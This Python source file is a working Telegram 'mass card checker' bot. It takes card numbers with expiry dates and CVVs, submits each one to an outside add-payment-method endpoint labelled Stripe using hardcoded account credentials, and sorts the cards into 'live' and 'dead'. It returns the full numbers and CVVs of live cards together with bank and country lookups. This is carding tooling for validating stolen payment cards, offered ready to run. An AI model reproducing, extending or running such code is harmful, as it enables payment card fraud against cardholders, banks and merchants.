import os
import re
import requests
import urllib.parse
import time
import asyncio
from concurrent.futures import ThreadPoolExecutor
from telegram import Update, InputFile
from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes
from typing import List, Dict, Any

# Configuration
TELEGRAM_BOT_TOKEN = os.getenv("TELEGRAM_BOT_TOKEN", "YOUR_BOT_TOKEN_HERE")
BASE_API_URL = "https://andul-1.onrender.com/add_payment_method"
EMAIL = "sogaged371@hudisk.com"
PASSWORD = "sogaged371@"

# Enhanced Bank database
BANK_DATABASE = {
    "4": {"brand": "VISA", "bank": "VISA", "country": "USA", "type": "CREDIT/DEBIT"},
    "41": {"brand": "VISA", "bank": "CHASE BANK", "country": "USA", "type": "CREDIT"},
    "42": {"brand": "VISA", "bank": "BANK OF AMERICA", "country": "USA", "type": "CREDIT"},
    "43": {"brand": "VISA", "bank": "CITIBANK", "country": "USA", "type": "CREDIT"},
    "44": {"brand": "VISA", "bank": "BARCLAYS", "country": "UK", "type": "CREDIT"},
    "45": {"brand": "VISA", "bank": "ROYAL BANK", "country": "CANADA", "type": "CREDIT"},
    "46": {"brand": "VISA", "bank": "SBERBANK", "country": "RUSSIA", "type": "DEBIT"},
    "47": {"brand": "VISA", "bank": "BANK OF CHINA", "country": "CHINA", "type": "CREDIT"},
    "48": {"brand": "VISA", "bank": "PKO BANK", "country": "POLAND", "type": "DEBIT"},
    "49": {"brand": "VISA", "bank": "ICICI BANK", "country": "INDIA", "type": "CREDIT"},
    "51": {"brand": "MASTERCARD", "bank": "MASTERCARD", "country": "USA", "type": "CREDIT"},
    "52": {"brand": "MASTERCARD", "bank": "MASTERCARD", "country": "USA", "type": "CREDIT"},
    "53": {"brand": "MASTERCARD", "bank": "MASTERCARD", "country": "USA", "type": "CREDIT"},
    "54": {"brand": "MASTERCARD", "bank": "MASTERCARD", "country": "USA", "type": "CREDIT"},
    "55": {"brand": "MASTERCARD", "bank": "MASTERCARD", "country": "USA", "type": "CREDIT"},
    "2221": {"brand": "MASTERCARD", "bank": "MASTERCARD", "country": "WORLD", "type": "CREDIT"},
    "2720": {"brand": "MASTERCARD", "bank": "MASTERCARD", "country": "WORLD", "type": "CREDIT"},
    "34": {"brand": "AMEX", "bank": "AMERICAN EXPRESS", "country": "USA", "type": "CREDIT"},
    "37": {"brand": "AMEX", "bank": "AMERICAN EXPRESS", "country": "USA", "type": "CREDIT"},
    "65": {"brand": "DISCOVER", "bank": "DISCOVER", "country": "USA", "type": "CREDIT"},
    "6011": {"brand": "DISCOVER", "bank": "DISCOVER", "country": "USA", "type": "CREDIT"},
    "35": {"brand": "JCB", "bank": "JCB", "country": "JAPAN", "type": "CREDIT"},
    "36": {"brand": "DINERS", "bank": "DINERS CLUB", "country": "USA", "type": "CREDIT"},
    "38": {"brand": "DINERS", "bank": "DINERS CLUB", "country": "USA", "type": "CREDIT"},
}

executor = ThreadPoolExecutor(max_workers=15)

def extract_main_message(response_text: str) -> tuple:
    """Extract status and clean message from API response."""
    if not response_text:
        return "❌ NO RESPONSE", "NO RESPONSE"
    
    response_text = response_text.lower().strip()
    
    patterns = {
        r'your card number is incorrect': ("❌ INCORRECT", "CARD NUMBER INCORRECT"),
        r'your card was declined': ("❌ DECLINED", "CARD DECLINED"), 
        r'card declined': ("❌ DECLINED", "CARD DECLINED"),
        r'insufficient funds': ("❌ INSUFFICIENT", "INSUFFICIENT FUNDS"),
        r'payment method added': ("✅ LIVE", "PAYMENT ADDED"),
        r'successfully added': ("✅ LIVE", "PAYMENT ADDED"),
        r'approved': ("✅ LIVE", "APPROVED"),
        r'success': ("✅ LIVE", "SUCCESS"),
        r'invalid card': ("❌ INVALID", "INVALID CARD"),
        r'incorrect cvc': ("❌ WRONG CVC", "INCORRECT CVC"),
        r'expired card': ("❌ EXPIRED", "EXPIRED CARD"),
        r'processing error': ("⚠️ ERROR", "PROCESSING ERROR"),
        r'timeout': ("⚠️ TIMEOUT", "TIMEOUT"),
        r'error': ("⚠️ ERROR", "ERROR"),
    }
    
    for pattern, (status, message) in patterns.items():
        if re.search(pattern, response_text, re.IGNORECASE):
            return status, message
    
    return "⚠️ UNKNOWN", "UNKNOWN RESPONSE"

def get_bin_details(bin_number: str) -> dict:
    """Get enhanced card details from BIN."""
    for prefix_length in [6, 5, 4, 3, 2, 1]:
        prefix = bin_number[:prefix_length]
        if prefix in BANK_DATABASE:
            info = BANK_DATABASE[prefix].copy()
            info["bin"] = bin_number
            return info
    
    # Default detection
    brand = "VISA" if bin_number.startswith("4") else "MASTERCARD" if bin_number.startswith("5") else "UNKNOWN"
    country = "USA" if bin_number.startswith(("4", "5")) else "UNKNOWN"
    bank = "UNKNOWN BANK"
    
    return {
        "bin": bin_number,
        "brand": brand,
        "bank": bank,
        "country": country,
        "type": "CREDIT"
    }

def parse_card_line(line: str) -> Dict[str, Any]:
    """Parse a single card line."""
    match = re.match(r'^(\d{13,19})\|(\d{1,2})\|(\d{2,4})\|(\d{3,4})$', line.strip())
    if not match:
        return None
    
    card_number = match.group(1)
    month = match.group(2).zfill(2)
    year_input = match.group(3)
    cvv = match.group(4)
    
    year_api = year_input[-2:] if len(year_input) == 4 else year_input
    year_full = "20" + year_api if len(year_api) == 2 else year_input
    
    return {
        "card_number": card_number,
        "month": month,
        "year": year_api,
        "year_full": year_full,
        "cvv": cvv,
        "bin": card_number[:6],
        "last4": card_number[-4:],
        "line": line.strip()
    }

def check_single_card(card_info: Dict[str, Any]) -> Dict[str, Any]:
    """Check a single card via API."""
    try:
        card_string = f"{card_info['card_number']}|{card_info['month']}|{card_info['year']}|{card_info['cvv']}"
        encoded_card = urllib.parse.quote(card_string, safe='')
        api_url = f"{BASE_API_URL}/{EMAIL}/{PASSWORD}/{encoded_card}"
        
        response = requests.get(api_url, timeout=15)
        status, message = extract_main_message(response.text)
        
        bin_info = get_bin_details(card_info['bin'])
        
        # Detect card level
        card_level = "CLASSIC"
        if card_info['card_number'].startswith(("4", "5")):
            if int(card_info['card_number'][6]) >= 5:
                card_level = "PLATINUM"
            elif int(card_info['card_number'][6]) >= 7:
                card_level = "SIGNATURE"
        
        return {
            "card": f"{card_info['bin']}...{card_info['last4']}",
            "full_card": card_info['card_number'],
            "exp": f"{card_info['month']}/{card_info['year_full']}",
            "cvv": card_info['cvv'],
            "status": status,
            "message": message,
            "brand": bin_info['brand'],
            "country": bin_info['country'],
            "bank": bin_info['bank'],
            "type": bin_info['type'],
            "level": card_level,
            "raw_line": card_info['line'],
            "is_live": "✅ LIVE" in status
        }
    except Exception as e:
        return {
            "card": f"{card_info['bin']}...{card_info['last4']}",
            "full_card": card_info['card_number'],
            "exp": f"{card_info['month']}/{card_info['year_full']}",
            "cvv": card_info['cvv'],
            "status": "❌ ERROR",
            "message": str(e)[:50],
            "brand": "UNKNOWN",
            "country": "UNKNOWN",
            "bank": "UNKNOWN",
            "type": "UNKNOWN",
            "level": "UNKNOWN",
            "raw_line": card_info['line'],
            "is_live": False
        }

async def start_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle /start command."""
    await update.message.reply_text(
        "💳 *MASS CARD CHECKER*\n\n"
        "*Single Check:*\n"
        "`/chk 5328544152353125|12|28|923`\n"
        "`.chk 4111111111111111|12|25|123`\n\n"
        "*Mass Check (1-30 cards):*\n"
        "`/mass` then send cards, `/done` to finish\n\n"
        "*File Upload:*\n"
        "Send .txt file with cards\n\n"
        "*Format:*\n"
        "`CARD|MM|YY|CVV`",
        parse_mode='Markdown'
    )

async def chk_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle single card check."""
    if not context.args:
        await update.message.reply_text(
            "❌ *Use:* `/chk CARD|MM|YY|CVV`",
            parse_mode='Markdown'
        )
        return
    
    user_input = " ".join(context.args)
    await process_single_card(update, user_input)

async def process_single_card(update: Update, card_input: str):
    """Process single card."""
    card_info = parse_card_line(card_input)
    
    if not card_info:
        await update.message.reply_text("❌ Wrong format!")
        return
    
    msg = await update.message.reply_text(f"🔍 *Checking:* `{card_info['bin']}...{card_info['last4']}`", parse_mode='Markdown')
    
    result = check_single_card(card_info)
    
    response = "─" * 40 + "\n"
    response += f"*CARD :* `{result['card']}`\n"
    response += f"*FULL :* `{result['full_card']}`\n" if result['is_live'] else ""
    response += f"*EXP :* {result['exp']} | *CVV:* {result['cvv']}\n"
    response += "─" * 40 + "\n"
    response += f"*STATUS :* {result['status']}\n"
    response += f"*MESSAGE :* {result['message']}\n"
    response += f"*GATEWAY :* STRIPE\n"
    response += "─" * 40 + "\n"
    response += f"*BIN :* {card_info['bin']}\n"
    response += f"*BRAND :* {result['brand']}\n"
    response += f"*BANK :* {result['bank']}\n"
    response += f"*COUNTRY :* {result['country']}\n"
    response += f"*TYPE :* {result['type']} | *LEVEL:* {result['level']}\n"
    response += "─" * 40
    
    await msg.edit_text(response, parse_mode='Markdown')

async def mass_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Start mass checking session."""
    context.user_data['mass_cards'] = []
    context.user_data['mass_mode'] = True
    
    await update.message.reply_text(
        "📦 *MASS CHECK MODE*\n\n"
        "Send cards (1-30) one per line:\n"
        "Example:\n"
        "`5328544152353125|12|28|923`\n"
        "`4111111111111111|12|25|123`\n\n"
        "*Commands:*\n"
        "`/done` - Start checking\n"
        "`/cancel` - Cancel",
        parse_mode='Markdown'
    )

async def done_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Finish mass card input and start checking."""
    if 'mass_cards' not in context.user_data or not context.user_data['mass_cards']:
        await update.message.reply_text("❌ No cards received!")
        context.user_data['mass_mode'] = False
        return
    
    cards = context.user_data['mass_cards']
    
    if len(cards) > 30:
        await update.message.reply_text(f"❌ Max 30 cards! You sent {len(cards)}")
        context.user_data['mass_mode'] = False
        return
    
    await process_mass_cards(update, cards)

async def cancel_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Cancel mass checking."""
    if 'mass_mode' in context.user_data:
        context.user_data['mass_mode'] = False
        if 'mass_cards' in context.user_data:
            del context.user_data['mass_cards']
        await update.message.reply_text("❌ Cancelled")

async def handle_mass_input(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle mass card input."""
    if not context.user_data.get('mass_mode', False):
        return
    
    text = update.message.text.strip()
    lines = text.split('\n')
    
    valid_cards = []
    
    for line in lines:
        card_info = parse_card_line(line)
        if card_info:
            valid_cards.append(card_info)
    
    if 'mass_cards' not in context.user_data:
        context.user_data['mass_cards'] = []
    
    context.user_data['mass_cards'].extend(valid_cards)
    total = len(context.user_data['mass_cards'])
    
    await update.message.reply_text(f"✅ Added {len(valid_cards)} cards | Total: {total}/30\nSend more or `/done`")

async def process_mass_cards(update: Update, cards: List[Dict[str, Any]]):
    """Process multiple cards and show live cards clearly."""
    total_cards = len(cards)
    
    status_msg = await update.message.reply_text(
        f"⚡ *MASS CHECK STARTED*\n"
        f"📊 Cards: {total_cards}\n"
        f"⏳ Checking... (0/{total_cards})",
        parse_mode='Markdown'
    )
    
    # Process cards concurrently
    loop = asyncio.get_event_loop()
    results = []
    
    for i, card_info in enumerate(cards):
        if i % 3 == 0:
            await status_msg.edit_text(
                f"⚡ *MASS CHECK*\n"
                f"📊 Cards: {total_cards}\n"
                f"⏳ Checking... ({i}/{total_cards})",
                parse_mode='Markdown'
            )
        
        result = await loop.run_in_executor(executor, check_single_card, card_info)
        results.append(result)
    
    # Separate live cards
    live_cards = [r for r in results if r['is_live']]
    dead_cards = [r for r in results if not r['is_live']]
    
    # Create detailed results file
    timestamp = int(time.time())
    filename = f"results_{timestamp}.txt"
    
    with open(filename, 'w', encoding='utf-8') as f:
        f.write("╔══════════════════════════════════════════╗\n")
        f.write("║         MASS CARD CHECK RESULTS          ║\n")
        f.write("╚══════════════════════════════════════════╝\n\n")
        
        f.write(f"📅 Date: {time.strftime('%Y-%m-%d %H:%M:%S')}\n")
        f.write(f"📊 Total Cards: {total_cards}\n")
        f.write(f"✅ Live Cards: {len(live_cards)}\n")
        f.write(f"❌ Dead Cards: {len(dead_cards)}\n")
        f.write("─" * 50 + "\n\n")
        
        # Show LIVE CARDS first with details
        if live_cards:
            f.write("════════════════════════════════════════════\n")
            f.write("             ✅ LIVE CARDS ✅              \n")
            f.write("════════════════════════════════════════════\n\n")
            
            for i, result in enumerate(live_cards, 1):
                f.write(f"【LIVE #{i}】\n")
                f.write(f"Card: {result['full_card']}\n")
                f.write(f"Exp: {result['exp']} | CVV: {result['cvv']}\n")
                f.write(f"BIN: {result['brand']} {result['bin']}\n")
                f.write(f"Bank: {result['bank']}\n")
                f.write(f"Country: {result['country']} | Type: {result['type']}\n")
                f.write(f"Level: {result['level']} | Status: {result['message']}\n")
                f.write("─" * 40 + "\n\n")
        
        # Show dead cards
        if dead_cards:
            f.write("════════════════════════════════════════════\n")
            f.write("             ❌ DEAD CARDS ❌               \n")
            f.write("════════════════════════════════════════════\n\n")
            
            for result in dead_cards:
                f.write(f"Card: {result['card']}\n")
                f.write(f"Exp: {result['exp']} | CVV: {result['cvv']}\n")
                f.write(f"Status: {result['status']} - {result['message']}\n")
                f.write("─" * 30 + "\n")
    
    # Send summary with LIVE cards highlighted
    summary = f"📊 *MASS CHECK COMPLETE*\n"
    summary += "─" * 35 + "\n"
    summary += f"✅ *LIVE CARDS:* {len(live_cards)}\n"
    summary += f"❌ *DEAD CARDS:* {len(dead_cards)}\n"
    summary += f"📁 *TOTAL:* {total_cards}\n"
    summary += "─" * 35 + "\n"
    
    # Show LIVE cards in message (first 5 if many)
    if live_cards:
        summary += "\n🎯 *LIVE CARDS FOUND:*\n"
        for i, card in enumerate(live_cards[:5], 1):
            summary += f"{i}. `{card['card']}` | {card['exp']} | {card['cvv']}\n"
            summary += f"   {card['bank']} | {card['country']}\n"
        
        if len(live_cards) > 5:
            summary += f"... and {len(live_cards) - 5} more live cards\n"
    
    summary += "\n*Full results sent as file below* 📎"
    
    await status_msg.edit_text(summary, parse_mode='Markdown')
    
    # Send results file
    with open(filename, 'rb') as f:
        await update.message.reply_document(
            document=InputFile(f, filename="card_results.txt"),
            caption=f"📊 {len(live_cards)} LIVE / {total_cards} Total"
        )
    
    # Clean up
    os.remove(filename)
    context.user_data['mass_mode'] = False
    if 'mass_cards' in context.user_data:
        del context.user_data['mass_cards']

async def handle_file_upload(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle file upload with cards."""
    if not update.message.document:
        return
    
    file = await update.message.document.get_file()
    file_path = f"temp_{int(time.time())}.txt"
    
    await file.download_to_drive(file_path)
    
    msg = await update.message.reply_text("📂 Reading file...")
    
    try:
        with open(file_path, 'r', encoding='utf-8') as f:
            content = f.read()
        
        lines = content.strip().split('\n')
        cards = []
        
        for line in lines:
            card_info = parse_card_line(line)
            if card_info:
                cards.append(card_info)
        
        if not cards:
            await msg.edit_text("❌ No valid cards found!")
            os.remove(file_path)
            return
        
        if len(cards) > 30:
            await msg.edit_text(f"❌ Max 30 cards! File has {len(cards)}")
            os.remove(file_path)
            return
        
        await msg.edit_text(
            f"📂 *File Loaded*\n"
            f"✅ Valid: {len(cards)} cards\n"
            f"Starting check...",
            parse_mode='Markdown'
        )
        
        await process_mass_cards(update, cards)
        
    except Exception as e:
        await msg.edit_text(f"❌ Error: {str(e)}")
    finally:
        if os.path.exists(file_path):
            os.remove(file_path)

async def handle_direct_card(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle direct single card input."""
    if context.user_data.get('mass_mode', False):
        await handle_mass_input(update, context)
        return
    
    text = update.message.text.strip()
    if re.match(r'^\d{13,19}\|\d{1,2}\|\d{2,4}\|\d{3,4}$', text):
        await process_single_card(update, text)

def main():
    """Start the bot."""
    if TELEGRAM_BOT_TOKEN == "YOUR_BOT_TOKEN_HERE":
        print("❌ Set TELEGRAM_BOT_TOKEN in .env")
        return
    
    app = Application.builder().token(TELEGRAM_BOT_TOKEN).build()
    
    # Commands
    app.add_handler(CommandHandler("start", start_command))
    app.add_handler(CommandHandler("chk", chk_command))
    app.add_handler(CommandHandler("check", chk_command))
    app.add_handler(CommandHandler("mass", mass_command))
    app.add_handler(CommandHandler("done", done_command))
    app.add_handler(CommandHandler("cancel", cancel_command))
    
    # Handlers
    app.add_handler(MessageHandler(filters.TEXT & filters.Regex(r'^\.chk\s+'), chk_command))
    app.add_handler(MessageHandler(filters.Document.TEXT, handle_file_upload))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_direct_card))
    
    print("💳 MASS CARD CHECKER BOT")
    print("=" * 50)
    print("Commands:")
    print("  /chk <card> - Single check")
    print("  /mass - Check multiple cards")
    print("  Send .txt file - File check")
    print("=" * 50)
    
    app.run_polling()

if __name__ == '__main__':
    main()
